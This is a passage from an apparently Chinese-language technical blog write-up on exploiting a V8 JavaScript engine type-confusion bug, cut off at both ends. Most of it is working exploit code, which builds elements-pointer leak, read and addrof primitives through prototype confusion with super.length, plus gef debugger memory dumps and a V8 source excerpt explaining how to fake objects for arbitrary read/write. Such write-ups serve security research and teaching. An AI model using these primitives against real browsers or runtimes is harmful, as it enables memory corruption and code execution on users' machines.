class="number">01</span></span><br><span class="line"><span class="number">0x279d08149244</span>:	<span class="number">0x08307259</span>	<span class="number">0x0804222d</span>	<span class="number">0x08149265</span>	<span class="number">0x081492ad</span></span><br><span class="line"><span class="number">0x279d08149254</span>:	<span class="number">0x08042205</span>	<span class="number">0x00000004</span>	<span class="number">0x00000002</span>	<span class="number">0x00000004</span></span><br><span class="line"><span class="number">0x279d08149264</span>:	<span class="number">0x08042b89</span>	<span class="number">0x00000020</span>	<span class="number">0x00000004</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x279d08149274</span>:	<span class="number">0x00000008</span>	<span class="number">0x00000004</span>	<span class="number">0x00000000</span>	<span class="number">0x00000002</span></span><br><span class="line"><span class="number">0x279d08149284</span>:	<span class="number">0x00000000</span>	<span class="number">0x080423b5</span>	<span class="number">0x080423b5</span>	<span class="number">0x080423b5</span></span><br><span class="line"><span class="number">0x279d08149294</span>:	<span class="number">0x080423b5</span>	<span class="number">0x080423b5</span>	<span class="number">0x080423b5</span>	<span class="number">0x00000002</span></span><br><span class="line"><span class="number">0x279d081492a4</span>:	<span class="number">0x00000004</span>	<span class="number">0x00000000</span>	<span class="number">0x080423d1</span>	<span class="number">0xccc00000</span></span><br><span class="line"><span class="number">0x279d081492b4</span>:	<span class="number">0x41dccccc</span>	<span class="number">0xbeadbeef</span></span><br><span class="line"></span><br><span class="line">gef➤  job <span class="number">0x279d081492ad</span></span><br><span class="line"><span class="number">1932735283.0</span></span><br></pre></td></tr></table></figure>

<p>然后有了有限范围内地址的读能力，便可以使用之前的对象 <code>o</code> 来构造 <code>addrof</code> 方法，整体代码如下：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> buf = <span class="keyword">new</span> <span class="title class_">ArrayBuffer</span>(<span class="number">16</span>);</span><br><span class="line"><span class="keyword">var</span> float64 = <span class="keyword">new</span> <span class="title class_">Float64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> bigUint64 = <span class="keyword">new</span> <span class="title class_">BigUint64Array</span>(buf);</span><br><span class="line"><span class="keyword">var</span> <span class="title class_">Uint32</span> = <span class="keyword">new</span> <span class="title class_">Int32Array</span>(buf);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">f2i</span>(<span class="params">f</span>)&#123;</span><br><span class="line">	float64[<span class="number">0</span>] = f;</span><br><span class="line">	<span class="keyword">return</span> bigUint64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">i2f</span>(<span class="params">i</span>)&#123;</span><br><span class="line">	bigUint64[<span class="number">0</span>] = i;</span><br><span class="line">	<span class="keyword">return</span> float64[<span class="number">0</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">hex</span>(<span class="params">i</span>)&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="string">&#x27;0x&#x27;</span> + i.<span class="title function_">toString</span>(<span class="number">16</span>).<span class="title function_">padStart</span>(<span class="number">16</span>, <span class="string">&#x27;0&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">printhex</span>(<span class="params">name,value</span>)&#123;</span><br><span class="line">	<span class="variable language_">console</span>.<span class="title function_">log</span>(name + <span class="string">&quot; : &quot;</span> + <span class="title function_">hex</span>(value));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">leak_elements_ptr</span>(<span class="params"></span>)&#123;</span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">O</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Object</span>&#123;</span><br><span class="line">		<span class="title function_">constructor</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="variable language_">super</span>();</span><br><span class="line">			<span class="variable language_">this</span>.<span class="property">x0</span> = <span class="variable language_">this</span>;</span><br><span class="line">			<span class="variable language_">this</span>[<span class="number">0</span>] = <span class="number">0x66666666</span> / <span class="number">2</span>;</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_">m</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable language_">super</span>.<span class="property">length</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> o = <span class="keyword">new</span> <span class="title function_">O</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="keyword">const</span> proto = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">		O.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> = proto;</span><br><span class="line">		proto.<span class="property">length</span>;</span><br><span class="line">		<span class="keyword">var</span> l = o.<span class="title function_">m</span>();</span><br><span class="line">		<span class="keyword">return</span> l;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">let</span> length = <span class="title function_">f</span>();</span><br><span class="line">		<span class="keyword">if</span>(length != <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> [o,length - <span class="number">1</span>];</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> [o,elements_ptr] = <span class="title function_">leak_elements_ptr</span>();</span><br><span class="line"><span class="title function_">printhex</span>(<span class="string">&quot;elements_ptr&quot;</span>,elements_ptr);</span><br><span class="line"></span><br><span class="line"><span class="keyword">function</span> <span class="title function_">get_read_and_addrof</span>(<span class="params">o,elements_ptr</span>)&#123;</span><br><span class="line">	<span class="keyword">class</span> <span class="title class_">A</span> <span class="keyword">extends</span> <span class="title class_ inherited__">Array</span>&#123;</span><br><span class="line">		<span class="title function_">constructor</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="variable language_">super</span>(<span class="number">1</span>,<span class="number">2</span>);</span><br><span class="line">		&#125;</span><br><span class="line">		<span class="title function_">m</span>(<span class="params"></span>)&#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="variable language_">super</span>.<span class="property">length</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">var</span> a = <span class="keyword">new</span> <span class="title function_">A</span>();</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">f</span>(<span class="params"></span>)&#123;</span><br><span class="line">		<span class="keyword">const</span> proto = <span class="keyword">new</span> <span class="title class_">String</span>(<span class="string">&quot;A&quot;</span>);</span><br><span class="line">		A.<span class="property"><span class="keyword">prototype</span></span>.<span class="property">__proto__</span> = proto;</span><br><span class="line">		proto.<span class="property">length</span>;</span><br><span class="line">		<span class="keyword">var</span> l = a.<span class="title function_">m</span>();</span><br><span class="line">		<span class="keyword">return</span> l;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span>(<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">0x100</span>; i++)&#123;</span><br><span class="line">		<span class="keyword">let</span> length = <span class="title function_">f</span>();</span><br><span class="line">		<span class="keyword">if</span>(length != <span class="number">1</span>)&#123;</span><br><span class="line">			<span class="keyword">break</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">read</span>(<span class="params">addr</span>)&#123;</span><br><span class="line">		a.<span class="property">length</span> = (addr - <span class="number">8</span>) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">let</span> l = <span class="title function_">f</span>();</span><br><span class="line">		a.<span class="property">length</span> = (addr - <span class="number">8</span> + <span class="number">2</span>) / <span class="number">2</span>;</span><br><span class="line">		<span class="keyword">let</span> h = <span class="title function_">f</span>();</span><br><span class="line">		<span class="keyword">return</span> ((h &lt;&lt; <span class="number">8</span>) &amp; <span class="number">0xff000000</span>) + (l &gt;&gt; <span class="number">8</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">function</span> <span class="title function_">addrof</span>(<span class="params">obj</span>)&#123;</span><br><span class="line">		o[<span class="number">0</span>] = obj;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_">read</span>(elements_ptr + <span class="number">8</span>) - <span class="number">1</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> [read,addrof];</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> [read,addrof] = <span class="title function_">get_read_and_addrof</span>(o,elements_ptr);</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">read</span>(elements_ptr)));</span><br><span class="line"><span class="title function_">print</span>(<span class="title function_">hex</span>(<span class="title function_">addrof</span>(o)));</span><br><span class="line">%<span class="title class_">DebugPrint</span>(o);</span><br><span class="line">%<span class="title class_">SystemBreak</span>();</span><br></pre></td></tr></table></figure>

<p>接下来是任意地址读写，当我们构造如下代码时：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> f = <span class="keyword">function</span> (<span class="params"></span>) &#123;&#125;;</span><br><span class="line"></span><br><span class="line">%<span class="title class_">DebugPrint</span>(f);</span><br><span class="line">%<span class="title class_">DebugPrint</span>(f.<span class="property"><span class="keyword">prototype</span></span>);</span><br></pre></td></tr></table></figure>

<p>可以发现 <code>f.prototype</code> 所返回的是一个对象，其指针位于 <code>f</code> 内存地址的 <code>+ 0x1c</code> 处：</p>
<figure class="highlight jsx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><span class="line">gef➤  job <span class="number">0x370408149349</span></span><br><span class="line"><span class="number">0x370408149349</span>: [<span class="title class_">Function</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x370408302281</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">FastProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x3704082c35ad</span> &lt;<span class="title class_">JSFunction</span> (sfi = <span class="number">0x3704082486cd</span>)&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x37040804222d</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="keyword">function</span> <span class="attr">prototype</span>: <span class="number">0x370408149369</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x370408307321</span>&gt;</span><br><span class="line"> - <span class="attr">initial_map</span>: </span><br><span class="line"> - <span class="attr">shared_info</span>: <span class="number">0x3704082d27a5</span> &lt;<span class="title class_">SharedFunctionInfo</span> f&gt;</span><br><span class="line"> - <span class="attr">name</span>: <span class="number">0x3704082d251d</span> &lt;<span class="title class_">String</span>[<span class="number">1</span>]: #f&gt;</span><br><span class="line"> - <span class="attr">builtin</span>: <span class="title class_">CompileLazy</span></span><br><span class="line"> - <span class="attr">formal_parameter_count</span>: <span class="number">0</span></span><br><span class="line"> - <span class="attr">kind</span>: <span class="title class_">NormalFunction</span></span><br><span class="line"> - <span class="attr">context</span>: <span class="number">0x3704082d2ae1</span> &lt;<span class="title class_">ScriptContext</span>[<span class="number">4</span>]&gt;</span><br><span class="line"> - <span class="attr">code</span>: <span class="number">0x370400045501</span> &lt;<span class="title class_">Code</span> <span class="variable constant_">BUILTIN</span> <span class="title class_">CompileLazy</span>&gt;</span><br><span class="line"> - source <span class="attr">code</span>: () &#123;&#125;</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x37040804222d</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt;</span><br><span class="line"> - <span class="title class_">All</span> own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x3704080446d1</span>: [<span class="title class_">String</span>] <span class="keyword">in</span> <span class="title class_">ReadOnlySpace</span>: #<span class="attr">length</span>: <span class="number">0x370408242339</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor), <span class="attr">location</span>: descriptor</span><br><span class="line">    <span class="number">0x3704080447e5</span>: [<span class="title class_">String</span>] <span class="keyword">in</span> <span class="title class_">ReadOnlySpace</span>: #<span class="attr">name</span>: <span class="number">0x3704082422f5</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor), <span class="attr">location</span>: descriptor</span><br><span class="line">    <span class="number">0x370408043e31</span>: [<span class="title class_">String</span>] <span class="keyword">in</span> <span class="title class_">ReadOnlySpace</span>: #<span class="attr">arguments</span>: <span class="number">0x37040824226d</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor), <span class="attr">location</span>: descriptor</span><br><span class="line">    <span class="number">0x37040804404d</span>: [<span class="title class_">String</span>] <span class="keyword">in</span> <span class="title class_">ReadOnlySpace</span>: #<span class="attr">caller</span>: <span class="number">0x3704082422b1</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor), <span class="attr">location</span>: descriptor</span><br><span class="line">    <span class="number">0x370408044a21</span>: [<span class="title class_">String</span>] <span class="keyword">in</span> <span class="title class_">ReadOnlySpace</span>: #<span class="attr">prototype</span>: <span class="number">0x37040824237d</span> &lt;<span class="title class_">AccessorInfo</span>&gt; (<span class="keyword">const</span> accessor descriptor), <span class="attr">location</span>: descriptor</span><br><span class="line"> &#125;</span><br><span class="line"> - feedback <span class="attr">vector</span>: feedback metadata is not available <span class="keyword">in</span> <span class="variable constant_">SFI</span></span><br><span class="line"></span><br><span class="line">gef➤  x/30wx <span class="number">0x370408149349</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x370408149348</span>:	<span class="number">0x08302281</span>	<span class="number">0x0804222d</span>	<span class="number">0x0804222d</span>	<span class="number">0x082d27a5</span></span><br><span class="line"><span class="number">0x370408149358</span>:	<span class="number">0x082d2ae1</span>	<span class="number">0x082d2aa5</span>	<span class="number">0x00045501</span>	<span class="number">0x08149369</span> <span class="comment">// f.prototype</span></span><br><span class="line"><span class="number">0x370408149368</span>:	<span class="number">0x08307321</span>	<span class="number">0x081493a1</span>	<span class="number">0x0804222d</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x370408149378</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x08045a01</span></span><br><span class="line"><span class="number">0x370408149388</span>:	<span class="number">0x00010001</span>	<span class="number">0x00000000</span>	<span class="number">0x080421f9</span>	<span class="number">0x08044115</span></span><br><span class="line"><span class="number">0x370408149398</span>:	<span class="number">0x000001a8</span>	<span class="number">0x08302283</span>	<span class="number">0x08042b39</span>	<span class="number">0x00000022</span></span><br><span class="line"><span class="number">0x3704081493a8</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000000</span>	<span class="number">0x00000008</span>	<span class="number">0x00000004</span></span><br><span class="line"><span class="number">0x3704081493b8</span>:	<span class="number">0x00000000</span>	<span class="number">0x080423b5</span></span><br><span class="line"></span><br><span class="line">gef➤  job <span class="number">0x370408149369</span></span><br><span class="line"><span class="number">0x370408149369</span>: [<span class="variable constant_">JS_OBJECT_TYPE</span>]</span><br><span class="line"> - <span class="attr">map</span>: <span class="number">0x370408307321</span> &lt;<span class="title class_">Map</span>(<span class="variable constant_">HOLEY_ELEMENTS</span>)&gt; [<span class="title class_">DictionaryProperties</span>]</span><br><span class="line"> - <span class="attr">prototype</span>: <span class="number">0x3704082c3c55</span> &lt;<span class="title class_">Object</span> map = <span class="number">0x3704083021b9</span>&gt;</span><br><span class="line"> - <span class="attr">elements</span>: <span class="number">0x37040804222d</span> &lt;<span class="title class_">FixedArray</span>[<span class="number">0</span>]&gt; [<span class="variable constant_">HOLEY_ELEMENTS</span>]</span><br><span class="line"> - <span class="attr">properties</span>: <span class="number">0x3704081493a1</span> &lt;<span class="title class_">NameDictionary</span>[<span class="number">17</span>]&gt;</span><br><span class="line"> - <span class="title class_">All</span> own properties (excluding elements): &#123;</span><br><span class="line">   <span class="attr">constructor</span>: <span class="number">0x370408149349</span> &lt;<span class="title class_">JSFunction</span> f (sfi = <span class="number">0x3704082d27a5</span>)&gt; (data, <span class="attr">dict_index</span>: <span class="number">1</span>, <span class="attr">attrs</span>: [<span class="variable constant_">W_C</span>])</span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">gef➤  x/30wx <span class="number">0x370408149369</span>-<span class="number">1</span></span><br><span class="line"><span class="number">0x370408149368</span>:	<span class="number">0x08307321</span>	<span class="number">0x081493a1</span>	<span class="number">0x0804222d</span>	<span class="number">0x00000000</span></span><br><span class="line"><span class="number">0x370408149378</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x08045a01</span></span><br><span class="line"><span class="number">0x370408149388</span>:	<span class="number">0x00010001</span>	<span class="number">0x00000000</span>	<span class="number">0x080421f9</span>	<span class="number">0x08044115</span></span><br><span class="line"><span class="number">0x370408149398</span>:	<span class="number">0x000001a8</span>	<span class="number">0x08302283</span>	<span class="number">0x08042b39</span>	<span class="number">0x00000022</span></span><br><span class="line"><span class="number">0x3704081493a8</span>:	<span class="number">0x00000002</span>	<span class="number">0x00000000</span>	<span class="number">0x00000008</span>	<span class="number">0x00000004</span></span><br><span class="line"><span class="number">0x3704081493b8</span>:	<span class="number">0x00000000</span>	<span class="number">0x080423b5</span>	<span class="number">0x080423b5</span>	<span class="number">0x080423b5</span></span><br><span class="line"><span class="number">0x3704081493c8</span>:	<span class="number">0x080423b5</span>	<span class="number">0x080423b5</span>	<span class="number">0x080423b5</span>	<span class="number">0x08044115</span></span><br><span class="line"><span class="number">0x3704081493d8</span>:	<span class="number">0x08149349</span>	<span class="number">0x00000220</span></span><br></pre></td></tr></table></figure>

<p>那么我们可以利用和之前一样的技巧，让 <code>function</code> 和我们自己构造的类混淆，并且在指定的内存区域伪造对象指针，在内存中伪造对象。然后通过 <code>f.prototype</code> 便可以得到一个伪造的对象进而进行任意地址读写的操作。</p>
<p>但是在实际尝试的时候会发现有问题，经过调试发现了问题所在。我们来看 <code>CodeStubAssembler::LoadJSFunctionPrototype</code> 函数：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">TNode&lt;HeapObject&gt; <span class="title">CodeStubAssembler::LoadJSFunctionPrototype</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">    TNode&lt;JSFunction&gt; function, Label* if_bailout)</span> </span>&#123;</span><br><span class="line">  <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">IsFunctionWithPrototypeSlotMap</span>(<span class="built_in">LoadMap</span>(function)));</span><br><span class="line">  <span class="built_in">CSA_ASSERT</span>(<span class="keyword">this</span>, <span class="built_in">IsClearWord32</span>&lt;Map::Bits1::HasNonInstancePrototypeBit&gt;(</span><br><span class="line">                       <span class="built_in">LoadMapBitField</span>(<span class="built_in">LoadMap</span>(function))));</span><br><span class="line">  TNode&lt;HeapObject&gt; proto_or_map = <span class="built_in">LoadObjectField</span>&lt;HeapObject&gt;(</span><br><span class="line">      function, JSFunction::kPrototypeOrInitialMapOffset);</span><br><span class="line">  <span class="built_in">GotoIf</span>(<span class="built_in">IsTheHole</span>(proto_or_map), if_bailout);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">TVARIABLE</span>(HeapObject, var_result, proto_or_map);</span><br><span class="line">  <span class="function">Label <span class="title">done</span><span class="params">(<span class="keyword">this</span>, &amp;var_result)</span></span>;</span><br><span class="line">  <span class="built_in">GotoIfNot</span>(<span class="built_in">IsMap</span>(proto_or_map), &amp;done);</span><br><span class="line"></span><br><span class="line">  var_result = <span class="built_in">LoadMapPrototype</span>(<span class="built_in">CAST</span>(proto_or_map));</span><br><span class="line">  <span class="built_in">Goto</span>(&amp;done);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">BIND</span>(&amp;done);</span><br><span class="line">  <span class="keyword">return</span> var_result.<span class="built_in">value</span>();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这里如果我们按照上面的说法，那么在 <code>GotoIfNot(IsMap(proto_or_map), &amp;done);</code> 的时候就会直接走到 <code>done</code> ，但是我们伪造的时候由于伪造的地址是一个 <code>SMI</code> ，所以并不是一个对象，就这样返回的话会导致 <code>v8</code> 认为最终返回的是一个 <code>SMI</code> 而不是对象。所以我们需要先在原本的地方放一个指针，指向一个 <code>map</code> ，之后再通过这个 <code>map</code> 去找 <code>prototype</code> ，也就是下面的过程：</p>
<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">gef➤  job <span class="number">0x26b308148a19</span></span><br><span class="line"><span class="number">0x26b308148a19</span>: [JSArray]</span><br><span class="line"> - map: <span class="number">0x26b3083072a9</span> &lt;<span class="built_in">Map</span>(PACKED_SMI_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x26b30814889d</span> &lt;B map = <span class="number">0x26b3083072d1</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x26b308148a59</span> &lt;FixedArray[<span class="number">2</span>]&gt; [PACKED_SMI_ELEMENTS]</span><br><span class="line"> - length: <span class="number">2</span></span><br><span class="line"> - properties: <span class="number">0x26b30804222d</span> &lt;FixedArray[<span class="number">0</span>]&gt;</span><br><span class="line"> - All own <span class="built_in">properties</span> (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x26b3080446d1</span>: [String] in ReadOnlySpace: <span class="meta">#length: 0x26b30824215d <span class="string">&lt;AccessorInfo&gt;</span> (const accessor descriptor), location: descriptor</span></span><br><span class="line">    <span class="number">0x26b3082d29dd</span>: [String] in OldSpace: #x0: <span class="number">858993459</span> (<span class="type">const</span> data field <span class="number">0</span>), location: in-object</span><br><span class="line">    <span class="number">0x26b3082d29ed</span>: [String] in OldSpace: #x1: <span class="number">858993459</span> (<span class="type">const</span> data field <span class="number">1</span>), location: in-object</span><br><span class="line">    <span class="number">0x26b3082d29fd</span>: [String] in OldSpace: #x2: <span class="number">858993459</span> (<span class="type">const</span> data field <span class="number">2</span>), location: in-object</span><br><span class="line">    <span class="number">0x26b3082d2a0d</span>: [String] in OldSpace: #x3: <span class="number">858993459</span> (<span class="type">const</span> data field <span class="number">3</span>), location: in-object</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x26b308148a59</span> &lt;FixedArray[<span class="number">2</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">1</span></span><br><span class="line">           <span class="number">1</span>: <span class="number">2</span></span><br><span class="line"> &#125;</span><br><span class="line"></span><br><span class="line">gef➤  job <span class="number">0x26b3083072a9</span></span><br><span class="line"><span class="number">0x26b3083072a9</span>: [Map]</span><br><span class="line"> - type: JS_ARRAY_TYPE</span><br><span class="line"> - instance size: <span class="number">64</span></span><br><span class="line"> - inobject properties: <span class="number">12</span></span><br><span class="line"> - elements kind: PACKED_SMI_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">8</span></span><br><span class="line"> - <span class="keyword">enum</span> length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x26b308307281</span> &lt;<span class="built_in">Map</span>(PACKED_SMI_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x26b3082d2b15</span> &lt;Cell value= <span class="number">1</span>&gt;</span><br><span class="line"> - instance <span class="built_in">descriptors</span> (own) #<span class="number">5</span>: <span class="number">0x26b308148b85</span> &lt;DescriptorArray[<span class="number">5</span>]&gt;</span><br><span class="line"> - prototype: <span class="number">0x26b30814889d</span> &lt;B map = <span class="number">0x26b3083072d1</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x26b3082cb635</span> &lt;JSFunction <span class="built_in">Array</span> (sfi = <span class="number">0x26b30824f9f1</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x26b3080421b9</span> &lt;Other heap <span class="built_in">object</span> (WEAK_FIXED_ARRAY_TYPE)&gt;</span><br><span class="line"> - construction 